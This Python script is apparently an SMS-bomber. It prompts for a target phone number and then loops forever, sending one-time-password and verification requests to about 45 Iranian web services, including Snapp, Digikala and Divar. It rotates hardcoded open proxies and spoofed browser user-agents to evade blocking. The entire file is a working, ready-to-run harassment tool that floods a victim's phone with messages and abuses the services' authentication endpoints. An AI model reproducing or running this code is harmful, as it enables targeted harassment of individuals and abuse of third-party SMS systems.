import requests
import random
import time
import sys
import os
import colorama
from colorama import Fore

colorama.init()

print(Fore.LIGHTMAGENTA_EX)
print(Fore.GREEN)
print()
print("                       ************************")
print()
print("                           Developer : ᴺᵒᵃ")
print()
print("                       ************************")
print()
print()

print(Fore.LIGHTCYAN_EX)
 
proxies = [
 {"http": "http://178.32.101.200:80"},
 {"http": "http://3.144.188.184:8080"},
 {"http": "http://165.154.227.34:80"},
 {"http": "http://41.193.84.196:3128"},
 {"http": "http://190.131.250.105:999"},
 {"http": "http://45.76.152.236:3128"},
 {"http": "http://184.191.162.4:3128"},
 {"http": "http://192.236.160.186:80"},
 {"http": "http://203.188.32.107:9812"},
 {"http": "http://170.155.2.119:80"},
 {"http": "http://125.228.27.210:9797"},
 {"http": "http://167.172.178.193:34969"},
 {"http": "http://140.227.211.47:8080"},
 {"http": "http://146.59.199.12:80"},
 {"http": "http://91.150.189.122:30389"},
 {"http": "http://165.154.226.242:80"},
 {"http": "http://202.70.67.93:80"},
 {"http": "http://8.208.82.80:8081"},
 {"http": "http://104.244.75.218:8080"},
 {"http": "http://153.126.179.216:8080"},
 {"http": "http://143.244.132.11:80"},
 {"http": "http://8.214.4.72:33080"},
 {"http": "http://103.144.247.53:8888"},
]

ran_proxy = random.choice(proxies)


number = input("Hi Noa :) Enter Your Target Phone Number (Without 0 ) : ")
url_divar = "https://api.divar.ir/v5/auth/authenticate"
json_divar = {"phone":number}

url_snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
json_snap = {"cellphone":"+98" + number}

url_snapfood = "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=914cf70d-6f96-4819-a8aa-5e451cdc601d&locale=fa"
json_snapfood = {"cellphone":"0" + number}

url_sheyp = "	https://www.sheypoor.com/api/v10.0.0/auth/send"
json_sheyp = {"username":"0" + number}

url_behtar = "https://bck.behtarino.com/api/v1/users/phone_verification/"
json_behtar = {"phone":"0" + number}

url_basallam = "https://auth.basalam.com/otp-request"
api_basallam = {"mobile":"0" + number, "client_id": "11"}

url_digipay = "https://app.mydigipay.com/digipay/api/users/send-sms"
json_digipay = {"cellNumber":"0" + number,"device":{"deviceId":"d520c7a8-421b-4563-b955-f5abc56b97ec","deviceModel":"WEB_BROWSER","deviceAPI":"WEB_BROWSER","osName":"WEB"}}

url_digi = "https://api.digikala.com/v1/user/authenticate/"
json_digi = {"backUrl":"/","username":"0" + number,"otp_call":True}

url_alibaba = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
json_alibaba = {"phoneNumber":number}

url_safar = "https://www.eligasht.com/Authentication/CheckUsername"
json_Safar = {"username":"0" + number}

url_tapsi = "https://api.tapsi.cab/api/v2.2/user"
json_tapsi = {"credential":{"phoneNumber":"0" + number,"role":"PASSENGER"},"otpOption":"SMS"}

url_balad = "https://account.api.balad.ir/api/web/auth/login/"
json_balad = {"phone_number":"0" + number,"os_type":"W"}

url_itool = "https://app.itoll.ir/api/v1/auth/login"
json_itool = {"mobile":"0" + number}

url_namava = "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request"
json_namava = {"UserName":"+98" + number}

url_pindo = "https://api.pindo.ir/v1/user/login-register/"
json_pindo = {"phone":"0" + number}

url_tagh = "https://gw.taaghche.com/v4/site/auth/signup"
json_tagh = {"contact":"0" + number}

url_anten = "https://api2.anten.ir/users"
json_anten = {"phone":"0" + number}

url_otagh = "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode"
json_otagh = {"userName":"0" + number}

url_sb = "https://app.snapp-box.com/api/v2/auth/otp/send"
json_sb = {"phoneNumber":"0" + number}

url_rihaS = "https://www.riiha.ir/api/v1.0/register/mobile"
json_rihaS = {"password":"ALITAHMASI865","mobile":"0" + number,"is_voice":"yes"}

url_jaj = "https://api.jajiga.com/api/auth/otp:send"
json_jaj = {"mobile":number}

url_ketab = "https://ketabchi.com/api/v1/auth/requestVerificationCode"
json_ketab = {"auth":{"phoneNumber":"0" + number}}

url_dr = "https://drdr.ir/api/registerEnrollment/verifyMobile"
json_dr = {"phoneNumber":"0" + number,"userType":"PATIENT"}

url_honar = "https://auth.honari.com/api/check-phone-number"
json_honar = {"username":"0" + number}

url_kami = "https://app.nobaarapp.ir/api/discount_code_send/"
json_kami = {"phone":"0" + number,"services":"nissan"}

url_ech = "https://lottery.rayanertebat.ir/api/User/Otp?t=1668160603687"
json_ech = {"mobileNo":"0" + number}

url_torob = "https://api.torob.com/v4/user/phone/send-pin/?phone_number=0"+number 
api_torob = {"phone_number":"0" + number}

url_otaghak = "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode"
api_otaghak = {"username":"0" + number}

url_bama = "https://account.bama.ir/api/otp/generate/v2"
api_bama = {"CellNumber": "0" + number, "Appname": "bamawebapplication", "smsfor": 6}

url_nobarrapp ="https://app.nobaarapp.ir/api/send_mobile/0"+number

url_jibit = "https://napi.jibit.ir/merchant/v1/users"
xml_jibit = {"identifier":"0" + number,"password":"Mohammad76"}

url_masterblit = "https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail=0"+number 

url_sabziman = "https://sabziman.com/wp-admin/admin-ajax.php"
html_sabziman = {"action":"newphoneexist","phonenumber":"0" + number}

url_fastfood = "https://atawich.com/Account/FoodPhoneNumberVerification/?lazyLoad=true&btnID=undefined"
json_fastfood = {"PhoneNumber":"0" + number,"call":"false","data1":"da0fa0f9-c854-40e2-9fc2-02608b8859e5","data2":"637469158829958600","ForgetPass":"false"}

url_timche = "https://api.timcheh.com/auth/otp/send"
json_timche = {"mobile":"0" + number}

url_bani = "https://mobapi.banimode.com/api/v2/auth/request"
json_bani = {"phone":"0" + number}

url_dgstyle = "https://www.digistyle.com/users/login-register/"
json_dgstyle = {"loginRegister[email_phone]":"0" + number}

url_delino = "https://www.delino.com/user/register"
json_delino = {"mobile":"0" + number}

url_pinket = "https://pinket.com/rudder/v1/page"
json_pinket = {"phoneNumber":"0" + number}

url_offch = "https://api.offch.com/auth/otp"
json_offch = {"username":"0" + number}

url_azki =  f"https://www.azki.com/api/vehicleorder/app/user/checkLoginAvailability/%7B%220{number}%22%3A%220"

url_3click = "https://api.3click.com/auth/validate"
json_3click = {"mobile":"0" + number}

url_khanumi = "https://www.khanoumi.com/accounts/verify?mobile=0"+number

url_bimebazar = "https://bimebazar.com/accounts/api/login_sec/"
json_bimebazar = {"username":"0" + number}

url_strip = "https://www.snapptrip.com/register"
json_strip = {"lang":"fa","country_id":"860","password":"Mohammad8932","mobile_phone":"0" + number,"country_code":"+98"}

url_smarket = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0"+number

url_sranande = "https://dsu.snapp.ir/otp_make"
json_sranande = {"mobile":"0" + number}

url_flightio = "https://flightio.com/bff/Authentication/CheckUserKey"
json_flightio = {"userKey":"98-" + number,"userKeyType":1}

url_nikaro = "https://panel.nikaro.ir/api/v3/login"
json_nikaro = {"username":"0" + number}

url_rojashap = "https://rojashop.com/api/auth/sendOtp"
json_rojashop = {"mobile":"0" + number}

url_ezpay = "https://app.ezpay.ir:8443/open/v1/user/validation-code"
json_ezpay = {"phoneNumber":"0" + number}

url_doctorto = "https://api.doctoreto.com/api/web/patient/v1/accounts/register"
json_doctorto = {"mobile":number,"country_id":205}

url_gap = "https://core.gap.im/v1/user/add.json?mobile=+98" + number

heads = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11;Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11;Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]

print(Fore.YELLOW)
print()


while True:
    
    random_head = random.choice(heads)

    
    req = requests.post(url=url_divar,json=json_divar,headers=random_head,proxies=ran_proxy)
    print("0 :","<< SEND >>" ,Fore.LIGHTMAGENTA_EX)

    req1 = requests.post(url=url_snap,json=json_snap,headers=random_head,proxies=ran_proxy)
    print("1 :","<< SEND >>" ,Fore.RESET)

    req2 = requests.post(url=url_sheyp,json=json_sheyp,headers=random_head,proxies=ran_proxy)
    print("2 :","<< SEND >>" ,Fore.BLUE)

    req3 = requests.post(url=url_behtar,json=json_behtar,headers=random_head,proxies=ran_proxy)
    print("3 :","<< SEND >>" ,Fore.GREEN)

    req4 = requests.post(url=url_digipay,json=json_digipay,headers=random_head,proxies=ran_proxy)
    print("4 :","<< SEND >>" ,Fore.CYAN)

    req5 = requests.post(url=url_digi,json=json_digi,headers=random_head,proxies=ran_proxy)
    print("5 :","<< SEND >>" ,Fore.LIGHTBLACK_EX)

    req6 = requests.post(url=url_alibaba,json=json_alibaba,headers=random_head,proxies=ran_proxy)
    print("6 :","<< SEND >>", Fore.LIGHTBLUE_EX)

    req7 = requests.post(url=url_dgstyle,json=json_dgstyle,headers=random_head,proxies=ran_proxy)
    print("7 :","<< SEND >>" ,Fore.LIGHTCYAN_EX)

    req8 = requests.post(url=url_balad,json=json_balad,headers=random_head,proxies=ran_proxy)
    print("8 :","<< SEND >>" ,Fore.LIGHTGREEN_EX)

    req9 = requests.post(url=url_itool,json=json_itool,headers=random_head,proxies=ran_proxy)
    print("9 :","<< SEND >>" ,Fore.LIGHTMAGENTA_EX)

    req10 = requests.post(url=url_namava,json=json_namava,headers=random_head,proxies=ran_proxy)
    print("10 :","<< SEND >>" ,Fore.LIGHTRED_EX)

    req11 = requests.post(url=url_pindo,json=json_pindo,headers=random_head,proxies=ran_proxy)
    print("11 :","<< SEND >>" ,Fore.LIGHTWHITE_EX)

    req12 = requests.post(url=url_tagh,json=json_tagh,headers=random_head,proxies=ran_proxy)
    print("12 :","<< SEND >>" , Fore.LIGHTYELLOW_EX)

    req13 = requests.post(url=url_anten,json=json_anten,headers=random_head,proxies=ran_proxy)
    print("13 :","<< SEND >>" ,Fore.MAGENTA)

    req14 = requests.post(url=url_otagh,json=json_otagh,headers=random_head,proxies=ran_proxy)
    print("14 :","<< SEND >>" ,Fore.RED)

    req15 = requests.post(url=url_sb,json=json_sb,headers=random_head,proxies=ran_proxy)
    print("15 :","<< SEND >>" ,Fore.BLUE)

    req16 = requests.post(url=url_jaj,json=json_jaj,headers=random_head,proxies=ran_proxy)
    print("16 :","<< SEND >>" ,Fore.YELLOW)

    req17 = requests.post(url=url_ketab,json=json_ketab,headers=random_head,proxies=ran_proxy)
    print("17 :","<< SEND >>" ,Fore.GREEN)

    req18 = requests.post(url=url_dr,json=json_dr,headers=random_head,proxies=ran_proxy)
    print("18 :","<< SEND >>" ,Fore.BLUE)

    req19 = requests.post(url=url_honar,json=json_honar,headers=random_head,proxies=ran_proxy)
    print("19 :","<< SEND >>" ,Fore.YELLOW)

    #req20 = requests.post(url=url_kami,json=json_kami,headers=random_head,proxies=ran_proxy)
    print("20 :","<< SEND >>" ,Fore.MAGENTA)

    req21 = requests.post(url=url_basallam,json=api_basallam,headers=random_head,proxies=ran_proxy)
    print("21 :","<< SEND >>" ,Fore.CYAN)

    req22 = requests.post(url=url_torob,json=api_torob,headers=random_head,proxies=ran_proxy)
    print("22 :","<< SEND >>" ,Fore.LIGHTWHITE_EX)

    req23 = requests.post(url=url_otaghak,json=api_otaghak,headers=random_head,proxies=ran_proxy)
    print("23 :","<< SEND >>" ,Fore.LIGHTBLACK_EX)

    req24 = requests.post(url=url_bama,json=api_bama,headers=random_head,proxies=ran_proxy)
    print("24 :","<< SEND >>" ,Fore.RESET)

    req25 = requests.get(url=url_nobarrapp,headers=random_head,proxies=ran_proxy)
    print("25 :","<< SEND >>" ,Fore.LIGHTMAGENTA_EX)
    
    req26 = requests.post(url=url_jibit,json=xml_jibit,headers=random_head,proxies=ran_proxy)
    print("26 :","<< SEND >>" ,Fore.GREEN)

    req27 = requests.post(url=url_sabziman,data=html_sabziman,headers=random_head,proxies=ran_proxy)
    print("27 :","<< SEND >>" ,Fore.BLUE)

    req28 = requests.post(url=url_fastfood,json=json_fastfood,headers=random_head,proxies=ran_proxy)
    print("28 :","<< SEND >>" ,Fore.MAGENTA)

    req29 = requests.post(url=url_timche,json=json_timche,headers=random_head,proxies=ran_proxy)
    print("29 :","<< SEND >>" ,Fore.RED)

    req30 = requests.post(url=url_bani,json=json_bani,headers=random_head,proxies=ran_proxy)
    print("30 :","<< SEND >>" ,Fore.CYAN)

    req31 = requests.post(url=url_delino,json=json_delino,headers=random_head,proxies=ran_proxy)
    print("31 :","<< SEND >>" ,Fore.LIGHTBLACK_EX)

    req32 = requests.post(url=url_pinket,json=json_pinket,headers=random_head,proxies=ran_proxy)
    print("32 :","<< SEND >>" ,Fore.YELLOW)

    req33 = requests.post(url=url_offch,json=json_offch,headers=random_head,proxies=ran_proxy)
    print("33 :","<< SEND >>" ,Fore.RESET)

    req34 = requests.post(url=url_khanumi,headers=random_head,proxies=ran_proxy)
    print("34 :","<< SEND >>" ,Fore.LIGHTMAGENTA_EX)

    req35 = requests.post(url=url_bimebazar,json=json_bimebazar,headers=random_head,proxies=ran_proxy)
    print("35 :","<< SEND >>" ,Fore.GREEN)

    req36 = requests.post(url=url_strip,json=json_strip,headers=random_head,proxies=ran_proxy)
    print("36 :","<< SEND >>" ,Fore.BLUE)

    req37 = requests.post(url=url_smarket,headers=random_head,proxies=ran_proxy)
    print("37 :","<< SEND >>" ,Fore.RED)

    req38 = requests.post(url=url_sranande,json=json_sranande,headers=random_head,proxies=ran_proxy)
    print("38 :","<< SEND >>" ,Fore.LIGHTBLACK_EX)

    req39 = requests.post(url=url_flightio,json=json_flightio,headers=random_head,proxies=ran_proxy)
    print("39 :","<< SEND >>" ,Fore.WHITE)

    req40 = requests.post(url=url_nikaro,json=json_nikaro,headers=random_head,proxies=ran_proxy)
    print("40 :","<< SEND >>" ,Fore.CYAN)

    req41 = requests.post(url=url_rojashap,json=json_rojashop,headers=random_head,proxies=ran_proxy)
    print("41 :","<< SEND >>" ,Fore.YELLOW)

    req42 = requests.post(url=url_ezpay,json=json_ezpay,headers=random_head,proxies=ran_proxy)
    print("42 :","<< SEND >>" ,Fore.MAGENTA)

    req43 = requests.post(url=url_doctorto,json=json_doctorto,headers=random_head,proxies=ran_proxy)
    print("43 :","<< SEND >>" ,Fore.GREEN)

    req44 = requests.post(url=url_gap,headers=random_head,proxies=ran_proxy)
    print("44 :","<< SEND >>" ,Fore.BLUE)


    time.sleep( random.randint( 1, 2 ) )
